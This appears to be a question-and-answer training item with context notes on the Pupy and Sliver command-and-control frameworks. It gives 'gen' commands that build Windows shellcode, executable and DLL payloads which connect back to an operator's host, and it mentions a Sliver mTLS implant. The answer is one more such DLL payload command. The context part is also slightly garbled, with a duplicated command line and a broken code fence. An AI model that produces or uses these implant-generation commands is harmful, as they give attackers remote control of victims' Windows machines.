Context:```
>> gen -f <format> <launcher> -t <transport>
```
### Windows Shellcode Payload with pupy
Generates a Windows shellcode payload that connects to the specified IP and port using a transport method.
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```
### Windows Executable Payload with pupy
Creates a Windows executable payload for **64-bit** architecture that connects back to the given host and port using the specified transport.
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```

## Generation a Windows Payload with generate command in sliver
The following command generates a Sliver implant for a Windows target using mTLS for secure communication. The payload is saved as an executable (`.exe`) file on the specified directory, ready to be deployed on a 64-bit Windows system.

 Question: Generate an example of using gen command related to creating  Windows DLLs with Pupy. Each command should follow the format similar to: \n >> gen -f <format> <launcher> -t <transport>. 

 Your response: 
```
>> gen -f dll -O windows -A x64 connect --host ip:port -t transport
```
